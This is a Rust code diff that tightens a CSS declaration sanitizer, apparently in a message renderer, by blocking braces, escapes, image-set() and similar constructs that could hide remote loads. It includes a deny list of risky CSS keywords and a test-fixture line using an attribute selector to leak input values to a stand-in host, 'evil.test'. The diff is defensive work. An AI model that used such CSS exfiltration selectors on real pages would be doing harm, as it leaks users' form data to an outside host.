@@ -179,12 +179,19 @@ fn strip_css_comments(css: &str) -> String {
 
 /// Keeps a declaration list (`a: b; c: d`) minus anything that can load or
 /// run something: remote `url()`, `expression()`, bindings, `@import`.
+/// Braces and `&` would open a nested rule whose selector escapes the
+/// message's scope, and a CSS escape or `image-set()` would hide a remote
+/// load from the `url()` check.
 pub fn filter_declarations(decls: &str) -> String {
     decls
         .split(';')
         .filter(|d| {
-            let lower = d.to_ascii_lowercase().replace(['\\', ' ', '\t', '\n', '\r'], "");
-            if lower.trim().is_empty()
+            let lower = d.to_ascii_lowercase().replace([' ', '\t', '\n', '\r'], "");
+            if lower.is_empty()
+                || lower.contains(['{', '}', '&', '\\'])
+                || lower.contains("image-set(")
+                || lower.contains("cross-fade(")
+                || lower.contains("x-remote:")
                 || lower.contains("expression(")
                 || lower.contains("-moz-binding")
                 || lower.contains("behavior:")
@@ -985,7 +992,7 @@ input[value^="a"] { background: url(http://evil.test/5) }
             <img src=\"https://example.test/logo.png\">\r\n";
         let out = render_thread(&[view(raw.as_bytes())], "");
         assert!(!out.html.contains("beacon.example.test"), "{}", out.html);
-        assert_eq!(out.html.matches("x-remote:").count() as u32, out.remote_by_message[0], "every remote load is counted");
+        assert_eq!(out.html.matches("x-remote:http").count() as u32, out.remote_by_message[0], "every remote load is counted");
     }
 
     #[test]
